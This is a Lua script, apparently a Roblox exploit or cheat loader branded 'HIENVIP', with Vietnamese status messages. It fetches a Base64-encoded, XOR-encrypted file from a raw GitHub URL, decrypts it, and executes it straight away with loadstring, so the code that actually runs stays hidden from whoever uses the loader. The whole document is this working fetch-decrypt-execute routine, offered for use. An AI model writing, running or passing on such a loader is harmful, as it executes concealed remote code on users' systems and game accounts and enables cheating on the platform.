--== HIENVIP PREMIUM LOADER v2 (Styled) ==--

local HttpService = game:GetService("HttpService")

local ENCRYPTED_RAW_URL = "https://raw.githubusercontent.com/hieu59323-cmd/CodeStunUnity/main/HIENVIPOPL.lua"
local XOR_KEY = 73

local function safeget(u)
    local ok, res = pcall(function()
        return game:HttpGet(u)
    end)
    if ok then return res end
    return nil
end

local function decode(payload)
    local ok, decoded = pcall(function()
        return HttpService:Base64Decode(payload)
    end)
    if not ok then 
        warn("Base64 lỗi") 
        return 
    end

    local bytes = {string.byte(decoded, 1, #decoded)}
    for i = 1, #bytes do
        bytes[i] = bit32 and bit32.bxor(bytes[i], XOR_KEY) or (bytes[i] ~ XOR_KEY)
    end

    return string.char(table.unpack(bytes))
end

task.spawn(function()
    task.wait(0.05)
    print("🔴 HIENVIP Loader: Đang tải script…")
end)

local enc = safeget(ENCRYPTED_RAW_URL)
if not enc then
    warn("Không tải được gói mã hóa!")
    return
end

local final = decode(enc)
if not final then
    warn("Giải mã thất bại!")
    return
end

loadstring(final)()
print("🔥 HIENVIP đã chạy thành công!")
